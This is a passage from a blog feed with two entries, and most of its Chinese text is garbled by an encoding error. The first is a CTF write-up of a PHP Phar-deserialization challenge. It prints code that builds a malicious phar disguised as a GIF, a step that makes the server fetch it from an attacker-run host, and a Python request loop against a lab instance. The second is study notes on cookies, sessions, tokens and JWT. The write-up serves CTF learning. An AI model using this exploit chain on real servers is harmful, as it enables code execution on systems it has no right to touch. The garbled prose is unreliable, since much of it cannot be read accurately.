â€¦..æ‰€ä»¥æ”¾å¼ƒè¿™ä¸ªæƒ³æ³•</li><li>å’‹ä¸€çœ‹å¥½åƒä»£ç é‡Œé¢å¹¶æ²¡æœ‰å…¶ä»–èƒ½å¤Ÿååºåˆ—åŒ–çš„åœ°æ–¹äº†, ç„¶åå°±æ¥åˆ°äº†æœ¬é¢˜çš„ç¬¬ä¸€ä¸ªè€ƒç‚¹â€“php ä¸­è§£æ Phar å½’æ¡£ä¸­çš„ Metadata çš„æ—¶å€™å¯èƒ½ä¼šæœ‰ååºåˆ—åŒ–çš„æ“ä½œ, æ–‡æ¡£ä¸­æè¿°çš„ Phar::getMetadata æ“ä½œ(<a href="http://php.net/manual/zh/phar.getmetadata.php">http://php.net/manual/zh/phar.getmetadata.php</a>)</li></ul><blockquote><ul><li>Phar?(æ–¹ä¾¿å¼€å‘è€…æ‰“åŒ…å’Œå‘å¸ƒ php åº”ç”¨çš„ç±»ä¼¼äº Java ä¸­çš„ Jar çš„ä¸€ç§æ–‡ä»¶)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-a854e4d73e1be186.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="What is Phar?(å®˜æ–¹æ–‡æ¡£)"></li><li>Phar å½’æ¡£çš„ç»“æ„<br><img src="http://upload-images.jianshu.io/upload_images/6949366-1a263bb5852f77a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Phar(å®˜æ–¹æ–‡æ¡£)"></li><li>Metadata : Phar å½’æ¡£ä¸­å¯ç”¨æ¥æè¿°æ­¤æ–‡æ¡£çš„ä¸€æ®µåºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²<img src="http://upload-images.jianshu.io/upload_images/6949366-f850f6f9d027f2df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="usage of Metadata(å®˜æ–¹æ–‡æ¡£)"></li><li>phar_parse_metadata çš„åˆå§‹åŒ–è°ƒç”¨, å…·ä½“ PHP æºç åœ¨ ext/phar/phar.c<br>æ‰§è¡Œæµç¨‹å¤§è‡´ä¸º:<br>â€¦.â€“&gt; phar_open_from_filename(1512 è¡Œçš„ php_stream_open_wrapper å‡½æ•°å¯ä»¥å¾—çŸ¥æ­¤å‡½æ•°å¤„ç† phar://æ‰“å¼€æœ¬åœ° phar æ–‡ä»¶ 1531 è¡Œè°ƒç”¨ä¸‹ä¸€ä¸ªå‡½æ•°)<img src="http://upload-images.jianshu.io/upload_images/6949366-a2c524ab1ddaff2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="phar_open_from_filename"><br>â€“&gt; phar_open_from_fp(1727 è¡Œè°ƒç”¨ä¸‹ä¸€ä¸ªå‡½æ•°)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-f61c565686e8f90f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="phar_open_from_fp"><br>â€“&gt; phar_parse_pharfile(1038ã€1122 è¡Œè°ƒç”¨ä¸‹ä¸€ä¸ªå‡½æ•°)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-4d37aa50d88c5bea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1038è¡Œ"> &gt; <img src="http://upload-images.jianshu.io/upload_images/6949366-8c514575ce533262.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1122è¡Œ"><br>â€“&gt; phar_parse_metadata(å‡½æ•°åœ¨ 609 è¡Œ)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-581792f19940680a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="phar_parse_metadataå‡½æ•°"></li></ul></blockquote><ul><li><p>è€Œä¸”é¢˜ç›®å†… upload æ“ä½œæä¾›äº†<code>file_get_content()</code>å‡½æ•° å…¶ä¸­åœ°å€å¯æ§,å¯ä»¥åˆ©ç”¨<code>phar://</code>åè®®è¯»å–æœ¬åœ° phar æ–‡ä»¶(phar åè®®ä¸æ”¯æŒè¿œç¨‹æ–‡ä»¶[TheÂ <em>phar</em>Â stream wrapper does not operate on remote files, and cannot operate on remote files, and so is allowed even when theÂ allow_url_fopenÂ andÂ allow_url_includeÂ INI options are disabled.</p><p>](<a href="http://php.net/manual/zh/phar.using.stream.php)),%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%E5%8F%AA%E8%A6%81%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA">http://php.net/manual/zh/phar.using.stream.php)),ä¹Ÿå°±æ˜¯è¯´åªè¦æ„é€ ä¸€ä¸ª</a> phar åˆ©ç”¨ upload å†™åˆ°æœåŠ¡å™¨ç›®å½•, å…¶ä¸­ metadata è®¾ç½®ä¸º Admin å¯¹è±¡,å°±å¯ä»¥è¿›å…¥ Admin çš„ææ„å‡½æ•°äº†</p></li><li><p>æ¥ä¸‹æ¥çš„é—®é¢˜å°±æ˜¯å¦‚ä½•çŒœå‡ºé‚£ä¸ªéšæœºæ•°?<br>ç­”æ¡ˆæ˜¯åŸºæœ¬ä¸ŠçŒœä¸å‡ºæ¥<a href="https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php">https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php</a> openssl_random_pseudo_bytes æ˜¯åŠ å¯†çº§åˆ«çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨<a href="https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator">https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator</a> è¿™æ˜¯é¢˜ç›®ç¬¬äºŒä¸ªæ­»èƒ¡åŒ</p></li><li><p>ç„¶åå°±åˆ°äº†é¢˜ç›®çš„ç¬¬äºŒä¸ªè€ƒç‚¹, åŒ¿åå‡½æ•°å…¶å®æ˜¯æœ‰çœŸæ­£çš„åå­— ä»æ³¨å†ŒåŒ¿åå‡½æ•°çš„æºç (Zend/zend<em>builtin_functions.c 1854 è¡Œ) å¤§ä½¬è¿˜å¯¹è¿™ä¸ªé€»è¾‘æˆè°‘äº†ä¸€ç•ª <img src="http://upload-images.jianshu.io/upload_images/6949366-5c491572afb463d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="anonymous_functions_has_name"><br><img src="http://upload-images.jianshu.io/upload_images/6949366-3f7ca4a955141198.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="name_of_anonymous_functions"><br>é¦–å…ˆåå­—ç¬¬ä¸€ä¸ªå­—ç¬¦è¢«æ›¿æ¢æˆäº†\0,ä¹Ÿå°±æ˜¯ç©ºå­—ç¬¦ ,ç„¶å do æ“ä½œå°† lambda</em>%d ä¸­çš„%d æ ¼å¼åŒ–æˆåŒ¿åå‡½æ•°çš„ä¸ªæ•°+1(ä» 1 å¼€å§‹)<br>æ‰€ä»¥æœ€åå¾—å‡ºçš„åŒ¿åå‡½æ•°çš„çœŸæ­£åå­—ä¸º:\0lambda_%d(%d æ ¼å¼åŒ–ä¸ºå½“å‰è¿›ç¨‹çš„ç¬¬ n ä¸ªåŒ¿åå‡½æ•°)</p></li><li><p>ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½çŸ¥é“å½“å‰çš„åŒ¿åå‡½æ•°åˆ°åº•æœ‰å¤šå°‘ä¸ª, å› ä¸ºæ¯è®¿é—®ä¸€æ¬¡é¢˜ç›®å°±ä¼šç”Ÿæˆä¸€ä¸ªåŒ¿åå‡½æ•°; æœ€åå°±å¼•å‡ºäº†æœ€åä¸€ä¸ªè€ƒç‚¹, Apache-prefork æ¨¡å‹(é»˜è®¤æ¨¡å‹)åœ¨æ¥å—è¯·æ±‚åä¼šå¦‚ä½•å¤„ç†,é¦–å…ˆ Apache ä¼šé»˜è®¤ç”Ÿæˆ 5 ä¸ª child server å»ç­‰å¾…ç”¨æˆ·è¿æ¥, é»˜è®¤æœ€é«˜å¯ç”Ÿæˆ 256 ä¸ª child server, è¿™æ—¶å€™å¦‚æœç”¨æˆ·å¤§é‡è¯·æ±‚, Apache å°±ä¼šåœ¨å¤„ç†å®Œ MaxRequestsPerChild ä¸ª tcp è¿æ¥å kill æ‰è¿™ä¸ªè¿›ç¨‹,å¼€å¯ä¸€ä¸ªæ–°è¿›ç¨‹å¤„ç†è¯·æ±‚(è¿™é‡ŒçŒœæµ‹ Orange å¤§å¤§åº”è¯¥ä¿®æ”¹äº†é»˜è®¤çš„ 0,å› ä¸º 0 ä¸ºæ°¸ä¸ kill æ‰å­è¿›ç¨‹ è¿™æ ·å°±æ— æ³• fork å‡ºæ–°è¿›ç¨‹äº†) åœ¨è¿™ä¸ªæ–°è¿›ç¨‹é‡Œé¢åŒ¿åå‡½æ•°å°±ä¼šæ˜¯ä» 1 å¼€å§‹çš„äº†</p></li></ul><p>æœ€åæ­¥éª¤åˆ†åˆ«æ˜¯:</p><ol><li>å…ˆç”Ÿæˆç¬¦åˆè¦æ±‚çš„ phar æ”¾å…¥è‡ªå·±çš„ vps ä¸­, ç”Ÿæˆä»£ç ä¸º</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$avatar</span> = <span class="hljs-string">&#x27;xxx&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.phar&#x27;</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;file.php&#x27;</span>] = <span class="hljs-string">&#x27;&lt;?php ?&gt;&#x27;</span>;<br><span class="hljs-variable">$p</span>-&gt;setMetadata(<span class="hljs-keyword">new</span> Admin());<br><span class="hljs-variable">$p</span>-&gt;setStub(<span class="hljs-string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br>rename(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.phar&#x27;</span>,<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.gif&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>å†è¯·æ±‚<code>?m=upload&amp;url=http://vps</code></li><li>å¯åŠ¨ Orange å¤§å¤§å†™çš„ fork è„šæœ¬</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://0c166fcd-fdb3-4807-a385-a6cecf962fcd.node4.buuoj.cn/?m=upload&amp;url=phar:///var/www/data/aa8b91c60cf8b507932015218d2c847d&amp;lucky=%00lambda_1&#x27;</span><br><br>header = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;UM_distinctid=1780a89b22a7dd-03a5f4de894f678-4c3f227c-144000-1780a89b22b5be; session-data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A6%3A%22avatar%22%3Bs%3A46%3A%22%2Fvar%2Fwww%2Fdata%2Faa8b91c60cf8b507932015218d2c847d%22%3B%7D-----1415716c7f33898b0082543bd26f12ab93a24e31&#x27;</span><br>&#125;<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r =requests.get(url,headers=header)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®¤è¯åŠä¼šè¯ç®¡ç†</title>
    <link href="/2021/05/29/Token%20Session%20Cookie%20JWT/"/>
    <url>/2021/05/29/Token%20Session%20Cookie%20JWT/</url>
    
    <content type="html"><![CDATA[<h1 id="Token-Session-Cookie-JWT"><a href="#Token-Session-Cookie-JWT" class="headerlink" title="Token Session Cookie JWT"></a>Token Session Cookie JWT</h1><h2 id="è®¤è¯"><a href="#è®¤è¯" class="headerlink" title="è®¤è¯:"></a>è®¤è¯:</h2><p>éªŒè¯ç”¨æˆ·çš„èº«ä»½ ç”¨æˆ·å¯†ç ç™»å½• çŸ­ä¿¡éªŒè¯ç  é‚®ç®±éªŒè¯ç </p><h2 id="æˆæƒ"><a href="#æˆæƒ" class="headerlink" title="æˆæƒ:"></a>æˆæƒ:</h2><p>ç»™ä»¥ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®æ”¹è´¦æˆ·(ä¸ªäºº)çš„æŸäº›ä¿¡æ¯èµ„æº å¦‚ï¼šæ‰‹æœºå®‰è£…åº”ç”¨æ—¶ app è¯¢é—®ä½  æ˜¯å¦å…è®¸è®¿é—®ç›¸å†Œ ä½¿ç”¨ä½ çš„éº¦å…‹é£ã€æ‘„åƒå¤´ è®¿é—®è”ç³»äººæ–¹å¼ï¼›å¾®ä¿¡å°ç¨‹åºç™»å½•æ˜¯å¦å…è®¸è·å–ä½ çš„æ˜µç§°ã€å¤´åƒã€åœ°åŒºã€æ€§åˆ«<br>å®ç°æˆæƒçš„æ–¹å¼æœ‰ï¼šcookieã€sessionã€tokenã€OAuth</p><h2 id="å‡­è¯"><a href="#å‡­è¯" class="headerlink" title="å‡­è¯:"></a>å‡­è¯:</h2><p>å®ç°è®¤è¯å’Œæˆæƒçš„å‰æéœ€è¦æœ‰è¯ä¹¦ è€Œè¿™å°±æ˜¯è®¤è¯çš„å‡­è¯</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie:"></a>Cookie:</h2><p>ç”¨äºè®°å½•ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ <strong>åœ¨ä¸€çº§åŸŸåå’ŒäºŒçº§åŸŸåä¹‹é—´å¯ä»¥å…±äº«ä½¿ç”¨ ä½†ä¸å¯è·¨åŸŸï¼</strong><br>| å‚æ•° | è¯´æ˜ |<br>| :â€”â€”â€“: | :â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-: |<br>| name=value | é”®å€¼å¯¹ï¼Œè®¾ç½® cookie åå’Œå¯¹åº”çš„å€¼ï¼Œè¦æ±‚ä¸ºå­—ç¬¦ä¸²ç±»å‹ Unicode-å­—ç¬¦ç¼–ç  äºŒè¿›åˆ¶-base64 |<br>| domain | cookie æ‰€å±åŸŸå é»˜è®¤æ˜¯å½“å‰åŸŸå |<br>| path | è®¾ç½® cookie åœ¨å“ªäº›ç›®å½•ç”Ÿæ•ˆ |<br>| maxAge | cookie å¤±æ•ˆæ—¶é—´ æ•´æ•° è´Ÿæ•°-1 åˆ™æ˜¯ä¸´æ—¶ cookie å…³é—­æµè§ˆå™¨å°±ä¼šå¤±æ•ˆ |<br>| expires | cookie å¤±æ•ˆæ—¶é—´ |<br>| secure | è®¾ç½®åè®® https ssl ä¼ è¾“å‰å°±ä¼šåŠ å¯†æ•°æ® |<br>| httpOnly | æ— æ³•é€šè¿‡ js è¯»å–åˆ° cookie ä½†èƒ½åœ¨ Application ä¸­ä¿®æ”¹ ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢äº† xss æ”»å‡» |</p><h2 id="Session"><a href="#Session" class="headerlink" title="Session:"></a>Session:</h2><p>åŸºäº cookie å®ç°çš„è®°å½•æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯ä¼šè¯çŠ¶æ€çš„æœºåˆ¶ session å­˜äºæœåŠ¡å™¨ç«¯ sessionid å­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„ cookie ä¸­<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1.png"></p><h2 id="Token"><a href="#Token" class="headerlink" title="Token:"></a>Token:</h2><ul><li><p>Access Token<br>|**uid(ç”¨æˆ·å”¯ä¸€æ ‡è¯†)<br>|**time(å½“å‰æ—¶é—´çš„æ—¶é—´æˆ³)<br>|__sign(token å‰å‡ ä½å“ˆå¸Œå‹ç¼©åå…­è¿›åˆ¶å­—ç¬¦ä¸²)<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2.png"><br><strong>ä¸å—åŒæºç­–ç•¥çš„é™åˆ¶ï¼</strong></p></li><li><p>Refresh Token<br>åˆ·æ–° Access Token çš„ å…¶å®æ²¡æœ‰å®ƒä¹Ÿå¯ä»¥åˆ·æ–° Token ä½†æ˜¯æ¯æ¬¡åˆ·æ–°éƒ½ä¼šè¦ç”¨æˆ·è¾“å…¥ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç </p></li></ul><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/3.png"></p><h3 id="Token-å’Œ-Session-çš„åŒºåˆ«"><a href="#Token-å’Œ-Session-çš„åŒºåˆ«" class="headerlink" title="Token å’Œ Session çš„åŒºåˆ«"></a>Token å’Œ Session çš„åŒºåˆ«</h3><ul><li>Session æ˜¯ä¸€ç§<strong>è®°å½•æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¼šè¯çŠ¶æ€çš„æœºåˆ¶ï¼Œä½¿æœåŠ¡ç«¯æœ‰çŠ¶æ€åŒ–ï¼Œå¯ä»¥è®°å½•ä¼šè¯ä¿¡æ¯</strong>ã€‚è€Œ Token æ˜¯<strong>ä»¤ç‰Œ</strong>ï¼Œ<strong>è®¿é—®èµ„æºæ¥å£ï¼ˆAPIï¼‰æ—¶æ‰€éœ€è¦çš„èµ„æºå‡­è¯</strong>ã€‚Token <strong>ä½¿æœåŠ¡ç«¯æ— çŠ¶æ€åŒ–ï¼Œä¸ä¼šå­˜å‚¨ä¼šè¯ä¿¡æ¯ã€‚</strong></li><li>Session å’Œ Token å¹¶ä¸çŸ›ç›¾ï¼Œä½œä¸ºèº«ä»½è®¤è¯ Token å®‰å…¨æ€§æ¯” Session å¥½ï¼Œå› ä¸ºæ¯ä¸€ä¸ªè¯·æ±‚éƒ½æœ‰ç­¾åè¿˜èƒ½é˜²æ­¢ç›‘å¬ä»¥åŠé‡æ”¾æ”»å‡»ï¼Œè€Œ Session å°±å¿…é¡»ä¾èµ–é“¾è·¯å±‚æ¥ä¿éšœé€šè®¯å®‰å…¨äº†ã€‚<strong>å¦‚æœä½ éœ€è¦å®ç°æœ‰çŠ¶æ€çš„ä¼šè¯ï¼Œä»ç„¶å¯ä»¥å¢åŠ  Session æ¥åœ¨æœåŠ¡å™¨ç«¯ä¿å­˜ä¸€äº›çŠ¶æ€ã€‚</strong></li><li>æ‰€è°“ Session è®¤è¯åªæ˜¯ç®€å•çš„æŠŠ User ä¿¡æ¯å­˜å‚¨åˆ° Session é‡Œï¼Œå› ä¸º SessionID çš„ä¸å¯é¢„æµ‹æ€§ï¼Œæš‚ä¸”è®¤ä¸ºæ˜¯å®‰å…¨çš„ã€‚è€Œ Token ï¼Œå¦‚æœæŒ‡çš„æ˜¯ OAuth Token æˆ–ç±»ä¼¼çš„æœºåˆ¶çš„è¯ï¼Œæä¾›çš„æ˜¯ è®¤è¯ å’Œ æˆæƒ ï¼Œè®¤è¯æ˜¯é’ˆå¯¹ç”¨æˆ·ï¼Œæˆæƒæ˜¯é’ˆå¯¹ App ã€‚å…¶ç›®çš„æ˜¯è®©æŸ App æœ‰æƒåˆ©è®¿é—®æŸç”¨æˆ·çš„ä¿¡æ¯ã€‚è¿™é‡Œçš„ Token æ˜¯å”¯ä¸€çš„ã€‚ä¸å¯ä»¥è½¬ç§»åˆ°å…¶å®ƒ App ä¸Šï¼Œä¹Ÿä¸å¯ä»¥è½¬åˆ°å…¶å®ƒç”¨æˆ·ä¸Šã€‚Session åªæä¾›ä¸€ç§ç®€å•çš„è®¤è¯ï¼Œå³åªè¦æœ‰æ­¤ SessionID ï¼Œå³è®¤ä¸ºæœ‰æ­¤ User çš„å…¨éƒ¨æƒåˆ©ã€‚æ˜¯éœ€è¦ä¸¥æ ¼ä¿å¯†çš„ï¼Œè¿™ä¸ªæ•°æ®åº”è¯¥åªä¿å­˜åœ¨ç«™æ–¹ï¼Œä¸åº”è¯¥å…±äº«ç»™å…¶å®ƒç½‘ç«™æˆ–è€…ç¬¬ä¸‰æ–¹ Appã€‚æ‰€ä»¥ç®€å•æ¥è¯´ï¼š<strong>å¦‚æœä½ çš„ç”¨æˆ·æ•°æ®å¯èƒ½éœ€è¦å’Œç¬¬ä¸‰æ–¹å…±äº«ï¼Œæˆ–è€…å…è®¸ç¬¬ä¸‰æ–¹è°ƒç”¨ API æ¥å£ï¼Œç”¨ Token ã€‚å¦‚æœæ°¸è¿œåªæ˜¯è‡ªå·±çš„ç½‘ç«™ï¼Œè‡ªå·±çš„ Appï¼Œç”¨ä»€ä¹ˆå°±æ— æ‰€è°“äº†ã€‚</strong></li></ul><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>åˆ©ç”¨ json çš„ä¸€ç§è®¤è¯æˆæƒæœºåˆ¶ï¼Œä¹Ÿæ˜¯ç›®å‰æœ€æµè¡Œçš„è·¨ç«™è®¤è¯çš„è§£å†³æ–¹æ¡ˆ</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/4.png"></p><ul><li>è·¨åŸŸæ—¶ JWT ä½äº POST è¯·æ±‚çš„æ•°æ®ä½“é‡Œ</li><li>ä¸€èˆ¬ä½äº http çš„è¯·æ±‚å¤´ Authorization é‡Œ ç”¨ Bearer æ¨¡å¼æ·»åŠ </li><li>URL ä¸­åŒ…å«</li></ul><h3 id="Token-å’Œ-JWT-çš„åŒºåˆ«"><a href="#Token-å’Œ-JWT-çš„åŒºåˆ«" class="headerlink" title="Token å’Œ JWT çš„åŒºåˆ«"></a>Token å’Œ JWT çš„åŒºåˆ«</h3><p><strong>ç›¸åŒï¼š</strong></p><ul><li>éƒ½æ˜¯è®¿é—®èµ„æºçš„ä»¤ç‰Œ</li><li>éƒ½å¯ä»¥è®°å½•ç”¨æˆ·çš„ä¿¡æ¯</li><li>éƒ½æ˜¯ä½¿æœåŠ¡ç«¯æ— çŠ¶æ€åŒ–</li><li>éƒ½æ˜¯åªæœ‰éªŒè¯æˆåŠŸåï¼Œå®¢æˆ·ç«¯æ‰èƒ½è®¿é—®æœåŠ¡ç«¯ä¸Šå—ä¿æŠ¤çš„èµ„æº</li></ul><p><strong>åŒºåˆ«ï¼š</strong></p><ul><li>Tokenï¼šæœåŠ¡ç«¯éªŒè¯å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„ Token æ—¶ï¼Œè¿˜éœ€è¦æŸ¥è¯¢æ•°æ®åº“è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œç„¶åéªŒè¯ Token æ˜¯å¦æœ‰æ•ˆã€‚</li><li>JWTï¼š å°† Token å’Œ Payload åŠ å¯†åå­˜å‚¨äºå®¢æˆ·ç«¯ï¼ŒæœåŠ¡ç«¯åªéœ€è¦ä½¿ç”¨å¯†é’¥è§£å¯†è¿›è¡Œæ ¡éªŒï¼ˆæ ¡éªŒä¹Ÿæ˜¯ JWT è‡ªå·±å®ç°çš„ï¼‰å³å¯ï¼Œä¸éœ€è¦æŸ¥è¯¢æˆ–è€…å‡å°‘æŸ¥è¯¢æ•°æ®åº“ï¼Œå› ä¸º JWT è‡ªåŒ…å«äº†ç”¨æˆ·ä¿¡æ¯å’ŒåŠ å¯†çš„æ•°æ®ã€‚</li></ul><p><strong>ä½¿ç”¨ cookie æ—¶éœ€è¦è€ƒè™‘çš„é—®é¢˜</strong></p><ul><li>å› ä¸ºå­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œå®¹æ˜“è¢«å®¢æˆ·ç«¯ç¯¡æ”¹ï¼Œä½¿ç”¨å‰éœ€è¦éªŒè¯åˆæ³•æ€§</li><li>ä¸è¦å­˜å‚¨æ•æ„Ÿæ•°æ®ï¼Œæ¯”å¦‚ç”¨æˆ·å¯†ç ï¼Œè´¦æˆ·ä½™é¢</li><li>ä½¿ç”¨ httpOnly åœ¨ä¸€å®šç¨‹åº¦ä¸Šæé«˜å®‰å…¨æ€§</li><li>å°½é‡å‡å°‘ cookie çš„ä½“ç§¯ï¼Œèƒ½å­˜å‚¨çš„æ•°æ®é‡ä¸èƒ½è¶…è¿‡ 4kb</li><li>è®¾ç½®æ­£ç¡®çš„ domain å’Œ pathï¼Œå‡å°‘æ•°æ®ä¼ è¾“</li><li><strong>cookie æ— æ³•è·¨åŸŸ</strong></li><li>ä¸€ä¸ªæµè§ˆå™¨é’ˆå¯¹ä¸€ä¸ªç½‘ç«™æœ€å¤šå­˜ 20 ä¸ª Cookieï¼Œæµè§ˆå™¨ä¸€èˆ¬åªå…è®¸å­˜æ”¾ 300 ä¸ª Cookie</li><li><strong>ç§»åŠ¨ç«¯å¯¹ cookie çš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œè€Œ session éœ€è¦åŸºäº cookie å®ç°ï¼Œæ‰€ä»¥ç§»åŠ¨ç«¯å¸¸ç”¨çš„æ˜¯ token</strong></li></ul><p><strong>ä½¿ç”¨ session æ—¶éœ€è¦è€ƒè™‘çš„é—®é¢˜</strong></p><ul><li>å°† session å­˜å‚¨åœ¨æœåŠ¡å™¨é‡Œé¢ï¼Œå½“ç”¨æˆ·åŒæ—¶åœ¨çº¿é‡æ¯”è¾ƒå¤šæ—¶ï¼Œè¿™äº› session ä¼šå æ®è¾ƒå¤šçš„å†…å­˜ï¼Œéœ€è¦åœ¨æœåŠ¡ç«¯å®šæœŸçš„å»æ¸…ç†è¿‡æœŸçš„ session</li><li>å½“ç½‘ç«™é‡‡ç”¨<strong>é›†ç¾¤éƒ¨ç½²</strong>çš„æ—¶å€™ï¼Œä¼šé‡åˆ°å¤šå° web æœåŠ¡å™¨ä¹‹é—´å¦‚ä½•åš session å…±äº«çš„é—®é¢˜ã€‚å› ä¸º session æ˜¯ç”±å•ä¸ªæœåŠ¡å™¨åˆ›å»ºçš„ï¼Œä½†æ˜¯å¤„ç†ç”¨æˆ·è¯·æ±‚çš„æœåŠ¡å™¨ä¸ä¸€å®šæ˜¯é‚£ä¸ªåˆ›å»º session çš„æœåŠ¡å™¨ï¼Œé‚£ä¹ˆè¯¥æœåŠ¡å™¨å°±æ— æ³•æ‹¿åˆ°ä¹‹å‰å·²ç»æ”¾å…¥åˆ° session ä¸­çš„ç™»å½•å‡­è¯ä¹‹ç±»çš„ä¿¡æ¯äº†ã€‚</li><li>å½“å¤šä¸ªåº”ç”¨è¦å…±äº« session æ—¶ï¼Œé™¤äº†ä»¥ä¸Šé—®é¢˜ï¼Œè¿˜ä¼šé‡åˆ°è·¨åŸŸé—®é¢˜ï¼Œå› ä¸ºä¸åŒçš„åº”ç”¨å¯èƒ½éƒ¨ç½²çš„ä¸»æœºä¸ä¸€æ ·ï¼Œéœ€è¦åœ¨å„ä¸ªåº”ç”¨åšå¥½ cookie è·¨åŸŸçš„å¤„ç†ã€‚</li><li><strong>sessionId æ˜¯å­˜å‚¨åœ¨ cookie ä¸­çš„ï¼Œå‡å¦‚æµè§ˆå™¨ç¦æ­¢ cookie æˆ–ä¸æ”¯æŒ cookie æ€ä¹ˆåŠï¼Ÿ</strong> ä¸€èˆ¬ä¼šæŠŠ sessionId è·Ÿåœ¨ url å‚æ•°åé¢å³é‡å†™ urlï¼Œæ‰€ä»¥ session ä¸ä¸€å®šéå¾—éœ€è¦é  cookie å®ç°</li><li><strong>ç§»åŠ¨ç«¯å¯¹ cookie çš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œè€Œ session éœ€è¦åŸºäº cookie å®ç°ï¼Œæ‰€ä»¥ç§»åŠ¨ç«¯å¸¸ç”¨çš„æ˜¯ token</strong></li></ul><p><strong>ä½¿ç”¨ token æ—¶éœ€è¦è€ƒè™‘çš„é—®é¢˜</strong></p><ul><li>å¦‚æœä½ è®¤ä¸ºç”¨æ•°æ®åº“æ¥å­˜å‚¨ token ä¼šå¯¼è‡´æŸ¥è¯¢æ—¶é—´å¤ªé•¿ï¼Œå¯ä»¥é€‰æ‹©æ”¾åœ¨å†…å­˜å½“ä¸­ã€‚æ¯”å¦‚ redis å¾ˆé€‚åˆä½ å¯¹ token æŸ¥è¯¢çš„éœ€æ±‚ã€‚</li><li><strong>token å®Œå…¨ç”±åº”ç”¨ç®¡ç†ï¼Œæ‰€ä»¥å®ƒå¯ä»¥é¿å¼€åŒæºç­–ç•¥</strong></li><li><strong>token å¯ä»¥é¿å… CSRF æ”»å‡»(å› ä¸ºä¸éœ€è¦ cookie äº†)</strong></li><li><strong>ç§»åŠ¨ç«¯å¯¹ cookie çš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œè€Œ session éœ€è¦åŸºäº cookie 